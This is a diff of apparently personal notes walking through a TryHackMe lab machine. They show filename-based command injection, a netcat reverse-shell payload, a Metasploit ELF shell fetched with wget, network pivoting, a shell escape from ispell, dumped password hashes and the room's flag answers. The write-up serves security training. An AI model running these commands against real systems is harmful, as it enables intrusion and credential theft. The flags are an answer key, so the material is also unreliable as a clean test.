@@ -211,7 +211,6 @@ If only one could get that wonderful feeling of accomplishment without having to
 
 and more quotes
 
-
 http://10.10.238.9/upload
 
 Allowed file types are txt and rtf
@@ -221,13 +220,11 @@ uploading test.txt
     hi
     File successfully uploaded
 
-
 using burp
 
 Content-Disposition: form-data; name="file"; filename="test.txt;id"
 
 Do intercept to this request
-
 
     uid=1000(www) gid=1000(www) groups=1000(www)
     File successfully uploaded
@@ -926,7 +923,6 @@ type="text/css">
   <link href="static/css/000010freelancer.min.css" rel="stylesheet">
   <title>upload</title>
 
-
 </head>
 <html lang="en">
   <!-- Navigation -->
@@ -986,7 +982,6 @@ or uploading�zThat filename was way too long!zcat r	T)r
                                                            zutf-8z�File successfully uploadedz
                                                                                               ftp.mofo.pwnsomeud
 
-
 bash-4.4$ cat uwsgi.ini
 cat uwsgi.ini
 [uwsgi]
@@ -1009,8 +1004,6 @@ ALLOWED_EXTENSIONS = {'txt', 'rtf'}
 app = Flask(__name__)
 app.secret_key = "mofosecret"
 app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024
-
-
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
@@ -1036,7 +1029,6 @@ def upload_form():
 	except Exception as e:
 	    return render_template("500.html", error = str(e))
 
-
 def allowed_file(filename):
            check = filename.rsplit('.', 1)[1].lower()
            check = check[:3] in ALLOWED_EXTENSIONS    
@@ -1045,7 +1037,6 @@ def allowed_file(filename):
 def filtering(filename):
            filtered = filename.replace("#","")
            return filtered
-
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
@@ -1085,13 +1076,6 @@ def upload_file():
 		else:
 			flash('Allowed file types are txt and rtf')
 			return redirect(request.url)
-
-
-
-
-
-
-
 
 if __name__ == "__main__":
     app.run()
@@ -1152,9 +1136,7 @@ La lista devuelta se pasa a una función lambda que imprime cada línea recibida
 with open("creds.txt", "wb") as local_file:
     ftp.retrbinary("RETR creds.txt", local_file.write)
 
-
 En este ejemplo, se abre un archivo "creds.txt" en modo binario (wb) y se almacena en una variable "local_file". Luego se utiliza el método "retrbinary" para descargar el archivo "creds.txt" del servidor. El primer argumento es "RETR creds.txt" que indica al servidor que queremos descargar el archivo "creds.txt", y el segundo argumento es "local_file.write" que indica dónde se debe guardar el archivo descargado.
-
 
 finally
 
@@ -1231,7 +1213,6 @@ drwxr-xr-x   59 root     root        4.0K Apr 22  2020 usr
 -rwxr-xr-x    1 root     root        2.9K May 16  2019 uwsgi-nginx-entrypoint.sh
 drwxr-xr-x   40 root     root        4.0K Apr 22  2020 var
 
-
 we are in a docker container
 
 .dockerenv
@@ -1282,7 +1263,6 @@ using metasploit
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
-
        =[ metasploit v6.2.33-dev                          ]
 + -- --=[ 2275 exploits - 1192 auxiliary - 406 post       ]
 + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
@@ -1319,12 +1299,10 @@ Final size of elf file: 207 bytes
 └─$ ls                                
 'a.txt;nc 168301415 443 -e sh'   ftp.py   shell.elf
 
-
 ┌──(kali㉿kali)-[~/Downloads/time_flies]
 └─$ python3 -m http.server 8000 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.36.116 - - [26/Jan/2023 16:49:59] "GET /shell.elf HTTP/1.1" 200 -
-
 
 bash-4.4$ wget http://10.8.19.103:8000/shell.elf
 wget http://10.8.19.103:8000/shell.elf
@@ -1334,7 +1312,6 @@ bash-4.4$ chmod +x shell.elf
 chmod +x shell.elf
 bash-4.4$ ./shell.elf
 ./shell.elf
-
 
 msf6 exploit(multi/handler) > run
 
@@ -1352,7 +1329,6 @@ MTU          : 65536
 Flags        : UP,LOOPBACK
 IPv4 Address : 127.0.0.1
 IPv4 Netmask : 255.0.0.0
-
 
 Interface  9
 ============
@@ -1411,7 +1387,6 @@ search mofo.pwn
 nameserver 127.0.0.11
 options ndots:0
 
-
 meterpreter > background
 
 https://infinitelogins.com/2021/02/20/using-metasploit-routing-and-proxychains-for-pivoting/
@@ -1438,9 +1413,7 @@ Module options (post/multi/manage/autoroute):
    SESSION                   yes       The session to run this module on
    SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
 
-
 View the full module info with the info, or info -d command.
-
 
 msf6 post(multi/manage/autoroute) > set SUBNET 102.168.150.0/24
 SUBNET => 102.168.150.0/24
@@ -1457,7 +1430,6 @@ Module options (post/multi/manage/autoroute):
    NETMASK  255.255.255.0     no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
    SESSION  2                 yes       The session to run this module on
    SUBNET   102.168.150.0/24  no        Subnet (IPv4, for example, 10.10.10.0)
-
 
 View the full module info with the info, or info -d command.
 
@@ -1507,14 +1479,11 @@ Module options (auxiliary/server/socks_proxy):
    USERNAME                   no        Proxy username for SOCKS5 listener
    VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
 
-
 Auxiliary action:
 
    Name   Description
    ----   -----------
    Proxy  Run a SOCKS proxy server
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -1533,17 +1502,13 @@ Module options (auxiliary/server/socks_proxy):
    USERNAME                   no        Proxy username for SOCKS5 listener
    VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
 
-
 Auxiliary action:
 
    Name   Description
    ----   -----------
    Proxy  Run a SOCKS proxy server
 
-
-
 View the full module info with the info, or info -d command.
-
 
 ┌──(kali㉿kali)-[~/Downloads/time_flies]
 └─$ sudo proxychains nmap -n -sT -Pn -p 22,80 192.168.150.0/24 
@@ -1566,7 +1531,6 @@ Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 17:56 EST
 [proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.32:80 <--socket error or timeout!
 [proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.35:80 <--socket error or timeout!
 [proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.38:80 
-
 
 Found 
  
@@ -1794,7 +1758,6 @@ chmod +x linpeas.sh
 www-data@Durius:/tmp$ ./linpeas.sh
 ./linpeas.sh
 
-
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
              ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
@@ -1831,7 +1794,6 @@ Hostname: Durius
 Writable folder: /dev/shm
 [+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
 [+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
-
 
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
 
@@ -2007,7 +1969,6 @@ cat: write error: Broken pipe
    Download URL: https://www.exploit-db.com/download/40003
    Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
   [1] exploit_x
@@ -2016,7 +1977,6 @@ cat: write error: Broken pipe
   [2] overlayfs
       CVE-2015-8660
       Source: http://www.exploit-db.com/exploits/39230
-
 
 ╔══════════╣ Protections
 ═╣ AppArmor enabled? .............. AppArmor Not Found
@@ -2036,7 +1996,6 @@ cat: write error: Broken pipe
 ╔══════════╣ Container details
 ═╣ Is this a container? ........... No
 ═╣ Any running containers? ........ No
-
 
                           ╔════════════════════════════════════════════════╗
 ══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
@@ -2259,7 +2218,6 @@ org.freedesktop.machine1               - -               -                (activ
 org.freedesktop.systemd1               1 systemd         root             :1.0          -                         -          -                  
 org.freedesktop.timedate1              - -               -                (activatable) -                         -         
 
-
                                         ╔═════════════════════╗
 ════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                         ╚═════════════════════╝
@@ -2339,7 +2297,6 @@ veth6cd6483 Link encap:Ethernet  HWaddr 4a:50:db:ac:c6:49
           collisions:0 txqueuelen:0 
           RX bytes:996 (996.0 B)  TX bytes:1030 (1.0 KiB)
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
@@ -2354,8 +2311,6 @@ tcp6       0      0 :::60060                :::*                    LISTEN      
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
@@ -2443,8 +2398,6 @@ me               pts/0    192.168.66.1     Thu Apr 23 15:46:36 -0500 2020
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                                        ╔══════════════════════╗
 ═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                        ╚══════════════════════╝
@@ -2466,7 +2419,6 @@ me               pts/0    192.168.66.1     Thu Apr 23 15:46:36 -0500 2020
 
 ╔══════════╣ Installed Compilers
 /usr/share/gcc-4.9
-
 
 ╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
 Apache version: Server version: Apache/2.4.10 (Debian)
@@ -2532,7 +2484,6 @@ server {
      }
 }
 
-
 -rw-r--r-- 1 root root 1332 Sep 30  2019 /etc/apache2/sites-available/000-default.conf
 <VirtualHost *:80>
 	ServerAdmin webmaster@localhost
@@ -2592,11 +2543,9 @@ pgsql.allow_persistent = On
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 drwxr-xr-x 2 root root 4096 Apr 17  2020 /etc/ldap
-
 
 ╔══════════╣ Searching ssl/ssh files
 Port 22
@@ -2615,7 +2564,6 @@ Subsystem	sftp	/usr/libexec/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Host *
     SendEnv LANG LC_*
@@ -2627,14 +2575,8 @@ Host *
 drwxr-xr-x 2 root root 4096 Apr 17  2020 /etc/pam.d
 -rw-r--r-- 1 root root 2133 Mar 25  2019 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Analyzing Keyring Files (limit 70)
 drwxr-xr-x 2 root root 4096 Apr 17  2020 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -2693,23 +2635,15 @@ EvkrLDeZxgxfbc/sHfbBqKzXK+GatEB+qA3OQKm0np4G1DI3Jr++g0jttaAgwzE7
 =KdZN
 -----END PGP SIGNATURE-----
 
-
 ╔══════════╣ Searching docker files (limit 70)
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
 lrwxrwxrwx 1 root root 33 Apr 17  2020 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
 -rw-r--r-- 1 root root 0 Apr 17  2020 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket
 
-
 ╔══════════╣ Analyzing FTP Files (limit 70)
-
 
 -rw-r--r-- 1 root root 69 Apr 19  2020 /etc/php/7.2/mods-available/ftp.ini
 -rw-r--r-- 1 root root 69 Apr 19  2020 /usr/share/php7.2-common/common/ftp.ini
-
-
-
-
-
 
 ╔══════════╣ Analyzing Interesting logs Files (limit 70)
 -rw-r----- 1 www-data adm 721376 Jan 26 18:14 /var/log/nginx/access.log
@@ -2719,16 +2653,7 @@ lrwxrwxrwx 1 root root 33 Apr 17  2020 /etc/systemd/system/sockets.target.wants/
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3515 Nov  5  2016 /etc/skel/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 675 Nov  5  2016 /etc/skel/.profile
-
-
-
-
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
@@ -2890,7 +2815,6 @@ sendmail
 Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)
 Found /var/lib/mlocate/mlocate.db: regular file, no read permission
 Found /var/www/html/inc/data/database.db: empty
-
 
 ╔══════════╣ Web files?(output limit)
 /var/www/:
@@ -3119,8 +3043,6 @@ Session completed.
 
 after 30 min
 
-
-
 www-data@Durius:/home$ python -c 'import pty;pty.spawn("/bin/bash")'
 python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@Durius:/home$ su benclower
@@ -3161,20 +3083,15 @@ then !ls (read)
 
 !sh (bash)
 
-
-
 ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
 /var/log/kern.log
 /var/log/auth.log
-
 
 benclower@Durius:/home$ ispell /bin/bash
 ispell /bin/bash
 Screen too small:  need at least 10 lines
 Warning:  Can't write to /bin/bash
     dH              File: /bin/bash [READONLY]
-
-
 
 [SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
 !ls
@@ -3184,22 +3101,14 @@ benclower  me
 -- Type space to continue --    
     dH              File: /bin/bash [READONLY]
 
-
-
 [SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
     �A              File: /bin/bash [READONLY]
-
-
 
 [SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
     NR              File: /bin/bash [READONLY]
 
-
-
 [SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
     �F              File: /bin/bash [READONLY]
-
-
 
 [SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
 !sh
@@ -3323,13 +3232,7 @@ sshd:*:18369:0:99999:7:::
 me:$6$JMeslftJ$Xd6fu6ugqKxYIsxfBhqPFmb7PaYoH0HIJNX7rB3hepGzJrzjkmBmGvgar9OILwosmNRgwAaXiOcRhWyF8tg53.:18369:0:99999:7:::
 benclower:$6$ymSNcGgc$0zCfgdZ9BgY7G04RYaFYMKawc6nO.XoGQLC5XcH39xpLokRsK/koI12FR8u1n5V.hZwr7cz01E8jcYZl06cCZ1:18374:0:99999:7:::
 
-
 ```
-
-![[Pasted image 20230126190959.png]]
-
-![[Pasted image 20230126195648.png]]
-![[Pasted image 20230126210011.png]]
 
 What is flag 1?
 
@@ -3338,6 +3241,5 @@ What is flag 1?
 What is flag 2?
 
 *THM{Great_work!_You_Rooted_TempusFugitDurius!}*
-
 
 [[OWASP API Security Top 10 - 2]]
